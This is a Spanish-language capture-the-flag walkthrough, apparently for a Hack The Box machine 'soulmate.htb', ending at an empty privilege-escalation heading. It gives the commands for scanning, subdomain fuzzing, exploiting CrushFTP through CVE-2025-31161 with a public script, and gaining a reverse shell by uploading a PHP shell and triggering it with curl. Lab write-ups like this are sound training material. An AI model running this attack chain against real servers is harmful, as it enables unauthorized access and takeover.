## Reconocimiento
Empezaremos haciendo uso de [[NMAP]] para hacer un reconocimiento inicial
`nmap -sSCV -p- --open --min-rate 5000 -n -Pn -vvv <IP>`

Nos encontramos abiertos los puertos `22/ssh` `80/HTTP`
Navegamos al puerto `80` vía web y nos encontramos una web `soulmate.htb` que la añadiremos al `/etc/hosts` junto con la IP correspondiente de la maquina, volvemos a recargar el navegador y ya nos carga la web.

Haremos fuzzing sobre los directorios con [[GOBUSTER]] `gobuster -u http://soulmate.htp` una vez hemos hecho esto y no hemos encontrado nada relevante

Haremos fuzzing de subdominios con [[FFUF]] `ffuf -u http://soulmate.htb -H "Host: FUZZ.soulmate.htb" \ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 4`
Encontramos un dominio llamado `ftp.soulmate.htb` así que navegamos a el.

Nos encontramos una web de gestión de FTP llamado `CrushFTP`, buscamos en el código fuente y encontramos la versión `11.W.657`, navegamos por internet en búsqueda de vulnerabilidades que haya habido y encontramos el CVE `CVE-2025-31161`
## Explotación
Para poder explotarlo nos descargamos el repositorio `git clone https://github.com/Immersive-Labs-Sec/CVE-2025-31161` y ejecutamos el fichero `.py` 
`python cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user test --password admin123`

Con esto nos creara un usuario `test::admin123`

Accedemos a la web y en la parte de `Admin` en las opciones de usuario `User Option` nos encontramos diversos usuarios, seleccionamos a `ben` por que es un usuario raso y le cambiamos la contraseña.
Iniciamos sesión como `ben` y subimos una Shell inversa en la carpeta `/webProd`

Usaremos la siguiente shell `https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php`
En el archivo tenemos que modificar la IP de escucha y el PUERTO

En la maquina atacante nos ponemos en escucha por ese puerto con [[NETCAT]] con `nc -lnvp 1234`

Ejecutamos la Shell con curl `curl http://soulmate.htb/shell.php`

Y obtendremos una reverse shell como `ben`

## Escalada de Privilegios

